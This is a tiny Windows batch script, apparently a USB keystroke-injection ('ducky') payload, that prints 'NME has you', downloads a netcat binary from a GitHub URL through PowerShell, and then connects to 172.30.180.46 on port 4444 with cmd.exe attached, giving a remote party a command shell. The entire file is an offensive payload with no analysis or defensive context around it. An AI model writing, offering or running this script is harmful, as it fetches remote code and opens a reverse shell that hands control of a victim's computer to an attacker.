@echo off
echo NME has you.....
powershell -Command "& wget 'https://github.com/aquaktus/ducky-payload/blob/master/nc.txt?raw=true' -UseBasicParsing -O nc.exe"
nc -nv 172.30.180.46 4444 -e cmd.exe
